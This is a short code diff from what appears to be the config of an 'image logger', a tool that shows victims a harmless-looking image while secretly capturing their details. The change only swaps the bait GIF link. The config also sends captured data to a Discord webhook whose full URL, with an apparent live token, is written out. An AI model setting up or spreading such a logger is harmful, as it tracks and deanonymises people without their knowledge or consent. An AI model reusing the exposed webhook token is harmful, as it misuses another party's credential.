@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1571728893310935222/POl5lAP5XXRbHBpwg6V2ALtQZ-G1q9WV4YgLUkVmgYXsAXBKxzLqPJBYxWwaArH34Xa2",
-    "image": "https://tenor.com/view/flightreacts-tongue-laugh-flightreacts-flight-tongue-tongue-laugh-gif-739589491343629007", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/YVnhoxI93E4AAAAe/flight-tongue-flight-stream.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
